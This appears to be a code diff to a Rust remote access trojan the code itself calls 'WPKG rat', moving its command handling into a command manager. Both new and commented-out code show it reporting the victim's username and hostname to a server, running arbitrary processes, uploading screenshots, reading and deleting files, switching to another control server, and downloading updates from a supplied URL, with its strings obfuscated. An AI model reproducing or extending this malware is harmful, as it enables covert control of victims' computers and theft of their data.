@@ -4,14 +4,20 @@ use std::sync::{Arc, Mutex};
 use std::time::{Duration, SystemTime};
 use std::{thread, time};
 
-use anyhow::anyhow;
 use anyhow::Result;
 use async_recursion::async_recursion;
+use lazy_static::lazy_static;
 use tracing::{error, info};
+use wpkg_crypto::decode;
 
+use crate::commands::CommandsManager;
+use crate::info_crypt;
 use crate::unwrap::CustomUnwrap;
-use crate::{crypto, error_crypt, globals, updater};
-use crate::{info_crypt, utils};
+use crate::{crypto, error_crypt, globals};
+
+lazy_static! {
+    pub static ref COMMANDS: CommandsManager = CommandsManager::new();
+}
 
 #[async_recursion(?Send)]
 pub async fn connect(addr: String) {
@@ -176,160 +182,188 @@ impl Client {
             format!("/setname {}@{}", whoami::username(), whoami::hostname()).as_str(),
         )?;
 
-        //setting version in server
+        // setting version in server
         self.send_command(format!("/about {}", globals::CURRENT_VERSION).as_str())?;
 
         while self.connected {
             // receive message from the server
-            let message = self.receive()?;
+            let buf = self.receive()?;
 
-            if message.is_empty() {
+            if buf.is_empty() {
                 return if self.reconnecting {
                     Ok(())
                 } else {
-                    Err(anyhow!(crypto!("Client crashed, reconnecting")))
+                    self.send("empty buffer received")
+                    //Err(anyhow!(crypto!("Client crashed, reconnecting")))
                 };
             }
 
-            // split message
-            let command = message.split_ascii_whitespace().collect::<Vec<&str>>();
+            async fn handle(client: &mut Client, buf: String) -> anyhow::Result<()> {
+                // split message
+                let command = buf.split_ascii_whitespace().collect::<Vec<&str>>();
 
-            // parse args to Vec
-            let args = command[1..command.len()].to_vec();
+                // parse args to Vec
+                let mut args = command[0..command.len()].to_vec();
 
-            match command[0] {
-                // get system status
-                "stat" => {
-                    self.send(&utils::stat())?;
-                }
+                let cmd = args[0];
 
-                "run" => {
-                    if args.clone().is_empty() {
-                        self.send("Missing argument")?;
-                    } else {
-                        let a = if args.len() <= 1 {
-                            vec![""]
-                        } else {
-                            args[1..args.len()].to_vec()
-                        };
-                        utils::run_process(args[0], a, false)?;
-                        self.send("Done")?;
-                    }
-                }
+                // remove command name from args
+                args = args[1..args.len()].to_vec();
 
-                "reconnect" => {
-                    if self.check_args(args.clone(), 2)? {
-                        match Client::new(format!("{}:{}", args[0], args[1])) {
-                            Ok(mut client) => {
-                                info!(
-                                    "{} {}: {}",
-                                    crypto!("Reconnected succesfully to"),
-                                    args[0],
-                                    args[1]
-                                );
+                // find command
+                let command = COMMANDS
+                    .commands
+                    .iter()
+                    .enumerate()
+                    .find(|&(_i, command)| decode(command.name()) == cmd);
 
-                                self.send(&crypto!(
-                                    "Succesfully reconnected client... disconnecting..."
-                                ))?;
-                                self.send_command("/disconnect")?;
+                if let Some((_i, cmd)) = command {
+                    if cmd.min_args() < args.len() {
+                        client.send("Missing arguments for the command.")?;
 
-                                self.reconnecting = true;
-
-                                self.close()?;
-
-                                client.run().await?;
-                            }
-                            Err(_e) => {
-                                let msg = crypto!("Error reconnecting to server");
-
-                                error!(msg);
-                                self.send(&msg)?;
-                            }
-                        }
-                    }
-                }
-
-                "screenshot" => {
-                    let url = utils::screenshot_url().await?;
-
-                    self.send(&url)?;
-                }
-
-                // disconnect from the server
-                "disconnect" => {
-                    self.send("Done")?;
-
-                    self.send_command("/disconnect")?;
-                    self.close()?;
-                }
-
-                "check-updates" => match updater::check_updates().await {
-                    Ok((up_to_date, new_version, url)) => {
-                        if !up_to_date {
-                            self.send(&format!("{} {}", crypto!("Disconnecting & starting update... because new version founded"), new_version))?;
-
-                            self.send("/disconnect")?;
-
-                            if let Err(err) = updater::update(&url).await {
-                                error!("{}: {err}", crypto!("Updating failed"));
-                            }
-                        } else {
-                            self.send(&crypto!("WPKG is up to date!"))?;
-                        }
+                        return Ok(());
                     }
 
-                    Err(e) => {
-                        let msg = format!("{} {}", crypto!("Failed to check updates"), e);
-
-                        error!("{msg}");
-
-                        self.send(&msg)?;
-                    }
-                },
-
-                "dev-update" => {
-                    if self.check_args(args.clone(), 1)? {
-                        self.send(&crypto!("Installing developer build... Disconnecting..."))?;
-
-                        self.send("/disconnect")?;
-
-                        if let Err(err) = updater::update(args[0]).await {
-                            error!("{}: {}", crypto!("Updating failed"), err)
-                        }
-                    }
+                    cmd.execute(client, args).await?;
+                } else {
+                    //client.send("unknown command")?;
                 }
 
-                "ping" => self.send("ping-received")?,
-
-                "version" => self.send(globals::CURRENT_VERSION)?,
-
-                // send help message
-                "help" => {
-                    let help = crypto!(
-                        "
-stat - sending pc stats (CPU, RAM and Swap)
-run <process> <args> - run process
-reconnect <ip> <port> - reconnecting to another ServerD
-screenshot - make screenshot and sending url
-disconnect - disconnecting ServerD Client
-check-updates - Checking updates
-dev-update <url> - Downloading and installing custom versin
-ping - sending ping
-version - get version of WPKG rat
-help - showing help
-cd <dir> - changing d
-pwd - showing directory
-ls - list files in dir
-mkdir <name> - creating folder
-rm <name> - removing file
-cat <name> - reading file
-"
-                    );
-
-                    self.send(&help)?;
-                }
-                _ => self.send(&crypto!("Unknown command"))?,
+                Ok(())
             }
+
+            if let Err(err) = handle(self, buf).await {
+                error!("Unexpected error in message handler: {}", err);
+                self.send("Unexpected error")?;
+            }
+
+            //                 "run" => {
+            //                     if args.clone().is_empty() {
+            //                         self.send("Missing argument")?;
+            //                     } else {
+            //                         let a = if args.len() <= 1 {
+            //                             vec![""]
+            //                         } else {
+            //                             args[1..args.len()].to_vec()
+            //                         };
+            //                         utils::run_process(args[0], a, false)?;
+            //                         self.send("Done")?;
+            //                     }
+            //                 }
+
+            //                 "reconnect" => {
+            //                     if self.check_args(args.clone(), 2)? {
+            //                         match Client::new(format!("{}:{}", args[0], args[1])) {
+            //                             Ok(mut client) => {
+            //                                 info!(
+            //                                     "{} {}: {}",
+            //                                     crypto!("Reconnected succesfully to"),
+            //                                     args[0],
+            //                                     args[1]
+            //                                 );
+
+            //                                 self.send(&crypto!(
+            //                                     "Succesfully reconnected client... disconnecting..."
+            //                                 ))?;
+            //                                 self.send_command("/disconnect")?;
+
+            //                                 self.reconnecting = true;
+
+            //                                 self.close()?;
+
+            //                                 client.run().await?;
+            //                             }
+            //                             Err(_e) => {
+            //                                 let msg = crypto!("Error reconnecting to server");
+
+            //                                 error!(msg);
+            //                                 self.send(&msg)?;
+            //                             }
+            //                         }
+            //                     }
+            //                 }
+
+            //                 "screenshot" => {
+            //                     let url = utils::screenshot_url().await?;
+
+            //                     self.send(&url)?;
+            //                 }
+
+            //                 // disconnect from the server
+            //                 "disconnect" => {
+            //                     self.send("Done")?;
+
+            //                     self.send_command("/disconnect")?;
+            //                     self.close()?;
+            //                 }
+
+            //                 "check-updates" => match updater::check_updates().await {
+            //                     Ok((up_to_date, new_version, url)) => {
+            //                         if !up_to_date {
+            //                             self.send(&format!("{} {}", crypto!("Disconnecting & starting update... because new version founded"), new_version))?;
+
+            //                             self.send("/disconnect")?;
+
+            //                             if let Err(err) = updater::update(&url).await {
+            //                                 error!("{}: {err}", crypto!("Updating failed"));
+            //                             }
+            //                         } else {
+            //                             self.send(&crypto!("WPKG is up to date!"))?;
+            //                         }
+            //                     }
+
+            //                     Err(e) => {
+            //                         let msg = format!("{} {}", crypto!("Failed to check updates"), e);
+
+            //                         error!("{msg}");
+
+            //                         self.send(&msg)?;
+            //                     }
+            //                 },
+
+            //                 "dev-update" => {
+            //                     if self.check_args(args.clone(), 1)? {
+            //                         self.send(&crypto!("Installing developer build... Disconnecting..."))?;
+
+            //                         self.send("/disconnect")?;
+
+            //                         if let Err(err) = updater::update(args[0]).await {
+            //                             error!("{}: {}", crypto!("Updating failed"), err)
+            //                         }
+            //                     }
+            //                 }
+
+            //                 "ping" => self.send("ping-received")?,
+
+            //                 "version" => self.send(globals::CURRENT_VERSION)?,
+
+            //                 // send help message
+            //                 "help" => {
+            //                     let help = crypto!(
+            //                         "
+            // stat - sending pc stats (CPU, RAM and Swap)
+            // run <process> <args> - run process
+            // reconnect <ip> <port> - reconnecting to another ServerD
+            // screenshot - make screenshot and sending url
+            // disconnect - disconnecting ServerD Client
+            // check-updates - Checking updates
+            // dev-update <url> - Downloading and installing custom versin
+            // ping - sending ping
+            // version - get version of WPKG rat
+            // help - showing help
+            // cd <dir> - changing d
+            // pwd - showing directory
+            // ls - list files in dir
+            // mkdir <name> - creating folder
+            // rm <name> - removing file
+            // cat <name> - reading file
+            // "
+            //                     );
+
+            //                     self.send(&help)?;
+            //                 }
+            //                 _ => self.send(&crypto!("Unknown command"))?,
+            //             }
         }
 
         Ok(())
